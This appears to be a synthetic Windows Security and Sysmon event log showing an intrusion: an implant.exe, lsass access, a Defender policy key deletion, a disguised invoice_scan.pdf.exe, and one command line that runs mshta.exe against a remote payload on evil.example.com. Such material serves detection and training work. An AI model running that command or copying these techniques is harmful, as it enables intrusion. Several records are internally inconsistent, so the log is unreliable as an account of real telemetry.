<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:23:37.0000000Z" /><EventRecordID>441</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">52112</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:23:46.0000000Z" /><EventRecordID>442</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-7275-8955-8750-1001</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">10.100.10.50</Data><Data Name="IpPort">12309</Data><Data Name="ProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="WorkstationName">WKSTN-CHARLIE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4697</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:25:44.0000000Z" /><EventRecordID>443</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">.</Data><Data Name="ServiceName">NTDS</Data><Data Name="ServiceFileName">C:\Windows\System32\cmd.exe</Data><Data Name="ServiceType">0x10</Data><Data Name="ServiceStartType">2</Data><Data Name="ServiceAccount">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>8</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:26:00.0000000Z" /><EventRecordID>444</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:26:00.0000000Z</Data><Data Name="SourceProcessId">61347</Data><Data Name="SourceImage">C:\Windows\System32\cmd.exe</Data><Data Name="TargetProcessId">18601</Data><Data Name="TargetImage">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="NewThreadId">6202</Data><Data Name="StartAddress">0x7ffa052dfb9a</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:26:27.0000000Z" /><EventRecordID>445</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:26:27.0000000Z</Data><Data Name="ProcessId">33218</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="QueryName">update.legit.com</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">10.0.1.12</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:26:37.0000000Z" /><EventRecordID>446</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">CORP</Data><Data Name="TargetServerName">WKSTN-BOB</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="ProcessName">C:\Windows\System32\net.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:26:40.0000000Z" /><EventRecordID>447</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">CORP</Data><Data Name="TargetServerName">WKSTN-CHARLIE</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="ProcessName">C:\Windows\System32\reg.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4697</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:28:37.0000000Z" /><EventRecordID>448</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">svc_backup</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="ServiceName">WindowsUpdate</Data><Data Name="ServiceFileName">C:\Windows\System32\wscript.exe</Data><Data Name="ServiceType">0x10</Data><Data Name="ServiceStartType">2</Data><Data Name="ServiceAccount">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:29:07.0000000Z" /><EventRecordID>449</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-6904-4262-5488-1001</Data><Data Name="TargetUserName">alice</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">54993</Data><Data Name="ProcessName">C:\Windows\System32\net.exe</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:29:13.0000000Z" /><EventRecordID>450</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">bob</Data><Data Name="Workstation">SRV-SQL01</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:29:25.0000000Z" /><EventRecordID>451</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:29:25.0000000Z</Data><Data Name="ProcessGuid">{0D751-7AC8-AB7F-5557}</Data><Data Name="ProcessId">19682</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="CommandLine">svchost.exe -k netsvcs</Data><Data Name="User">CORP\t.miller</Data><Data Name="ParentProcessId">6433</Data><Data Name="ParentImage">C:\Windows\System32\lsass.exe</Data><Data Name="ParentCommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="Hashes">MD5=b14cb429c00894da03817f9280f2a2c7,SHA256=2fd704f72995dd369ba36bdbdf76aa3850b0baa545f1a039816f7dad6452ec34</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:29:26.0000000Z" /><EventRecordID>452</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="SubjectLogonId">0x895e6f</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:29:35.0000000Z" /><EventRecordID>453</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-6004-5511-7943-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">56833</Data><Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:29:45.0000000Z" /><EventRecordID>454</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::172.16.5.10</Data><Data Name="Status">0x25</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:29:55.0000000Z" /><EventRecordID>455</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-2771-8892-2045-1001</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">19143</Data><Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="WorkstationName">DC01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:29:57.0000000Z" /><EventRecordID>456</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="SubjectLogonId">0x946d5a</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:30:19.0000000Z" /><EventRecordID>457</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:30:19.0000000Z</Data><Data Name="EventType">DeleteKey</Data><Data Name="ProcessId">45614</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="TargetObject">HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:30:49.0000000Z" /><EventRecordID>458</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-7857-7628-7361-1001</Data><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">3338</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="WorkstationName">DC01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>10</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:30:53.0000000Z" /><EventRecordID>459</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:30:53.0000000Z</Data><Data Name="SourceProcessId">23489</Data><Data Name="SourceImage">C:\Windows\System32\regsvr32.exe</Data><Data Name="TargetProcessId">48615</Data><Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data><Data Name="GrantedAccess">0x1fffff</Data><Data Name="CallTrace">C:\Windows\System32\ntdll.dll+0x48ec</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>8</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:31:09.0000000Z" /><EventRecordID>460</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:31:09.0000000Z</Data><Data Name="SourceProcessId">60410</Data><Data Name="SourceImage">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="TargetProcessId">62647</Data><Data Name="TargetImage">C:\Windows\System32\regsvr32.exe</Data><Data Name="NewThreadId">5973</Data><Data Name="StartAddress">0x7ff981df62f4</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:31:17.0000000Z" /><EventRecordID>461</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">9408</Data><Data Name="WorkstationName">JUMPHOST01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:31:42.0000000Z" /><EventRecordID>462</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:31:42.0000000Z</Data><Data Name="ProcessId">60809</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="TargetFilename">C:\Users\alice\Downloads\invoice_scan.pdf.exe</Data><Data Name="CreationUtcTime">2024-11-25T10:31:42.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:31:46.0000000Z" /><EventRecordID>463</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">49796</Data><Data Name="WorkstationName">SRV-FILE01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:31:56.0000000Z" /><EventRecordID>464</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="NewProcessId">0xe9e9</Data><Data Name="NewProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="CommandLine">mshta.exe http://evil.example.com/payload.hta</Data><Data Name="ParentProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x2e2</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:32:11.0000000Z" /><EventRecordID>465</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">t.miller</Data><Data Name="Workstation">WKSTN-BOB</Data><Data Name="Status">0xC0000064</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:32:12.0000000Z" /><EventRecordID>466</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="Workstation">WKSTN-ALICE</Data><Data Name="Status">0xC0000064</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:32:17.0000000Z" /><EventRecordID>467</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-6183-3954-2324-1001</Data><Data Name="TargetUserName">admin</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">22823</Data><Data Name="ProcessName">C:\Windows\System32\wscript.exe</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:32:42.0000000Z" /><EventRecordID>468</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0xa387</Data><Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="CommandLine">svchost.exe -k netsvcs</Data><Data Name="ParentProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xd3b</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:32:49.0000000Z" /><EventRecordID>469</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.100.10.50</Data><Data Name="IpPort">27460</Data><Data Name="WorkstationName">SRV-SQL01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:32:56.0000000Z" /><EventRecordID>470</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="TargetUserName">newuser104</Data><Data Name="TargetDomainName">.</Data><Data Name="PrivilegeList">-</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:33:18.0000000Z" /><EventRecordID>471</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-1067-5076-4707-1001</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">58498</Data><Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="WorkstationName">SRV-FILE01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:33:28.0000000Z" /><EventRecordID>472</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0x20b6</Data><Data Name="NewProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="CommandLine">wscript.exe C:\Users\Public\doc.vbs</Data><Data Name="ParentProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xe2e</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:33:42.0000000Z" /><EventRecordID>473</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-3192-6615-9031-1001</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">50183</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="WorkstationName">WKSTN-CHARLIE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:33:45.0000000Z" /><EventRecordID>474</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">alice</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">14864</Data><Data Name="WorkstationName">SRV-WEB01</Data></EventData></Event>
